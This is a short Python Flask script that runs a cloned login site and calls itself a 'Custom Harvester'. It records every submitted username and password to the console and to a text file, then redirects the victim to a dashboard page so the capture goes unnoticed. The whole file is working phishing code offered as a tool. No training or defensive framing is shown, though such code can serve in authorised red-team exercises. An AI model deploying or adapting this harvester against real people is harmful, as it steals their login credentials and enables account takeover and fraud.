from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__, template_folder='.', static_folder='static')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login.html', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # LOG THE CREDENTIALS
        print(f"\n[!] CREDENTIALS CAPTURED: {username}:{password}")
        with open('captured_credentials.txt', 'a') as f:
            f.write(f"Username: {username} | Password: {password}\n")
            
        # Redirect to the real dashboard after capturing
        return redirect('pm_dashboard.html')
    
    return render_template('login.html')

@app.route('/pm_dashboard.html')
def dashboard():
    return render_template('pm_dashboard.html')

@app.route('/documents.html')
def documents():
    return render_template('documents.html')

if __name__ == '__main__':
    print("Starting Custom Harvester on http://0.0.0.0:80")
    print("Capturing credentials to captured_credentials.txt...")
    app.run(host='0.0.0.0', port=80)
